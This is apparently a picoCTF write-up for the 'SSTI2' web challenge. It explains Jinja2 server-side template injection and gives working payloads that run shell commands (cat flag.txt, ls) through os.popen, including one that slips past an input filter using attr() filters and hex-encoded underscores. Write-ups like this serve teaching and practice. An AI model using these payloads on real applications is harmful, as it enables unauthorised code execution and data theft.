# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : SSTI2
# Description 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
# What is meant by SSIT
a web security vulnerability that happens when a web application takes user-provided input and unsafely embeds or concatenates it directly into a server-side template, rather than passing it safely as data
# Discover webpage
<img width="1599" height="771" alt="1{" src="https://github.com/user-attachments/assets/bb393cc9-a239-4882-8a9a-552f400174c7" />
As we see There is an input box And when we write something, the same thing comes back to us
so to do ssti vulnerability testing template engine <img width="575" height="347" alt="test" src="https://github.com/user-attachments/assets/21b70fd1-97e5-4746-af2d-b0b0570d932d" />

as we write {{7*7}} any math just Simple calculation the webpage replies with this:
<img width="1588" height="773" alt="2" src="https://github.com/user-attachments/assets/54ae928f-1bdd-48f5-93c0-846ddf66f603" />

when we Exploiting this vulnerability by this code here:
         
  {{ "".__class__.__base__.__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read() }}

the web page replies with this:
<img width="1599" height="770" alt="3" src="https://github.com/user-attachments/assets/392f3cbd-934c-487d-aa50-688091d19c15" />
is probably filter block us from execute code 
# Filter Bypass Strategy
To bypass these restrictions in Jinja2, we use two techniques:
1. Using filters instead of periods: Instead of writing object.attribute, we use Jinja2 filters such as object|attr("attribute").
2. Using hexadecimal encoding for underscores: To prevent detection of blocked words like __globals__, we write the underscore (_) in its hexadecimal encoding, which is \x5f. Therefore, __globals__ becomes:
# Exploit Payload
After understanding the strategy, we will move on to the encoding Payload and we get this:
  
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}




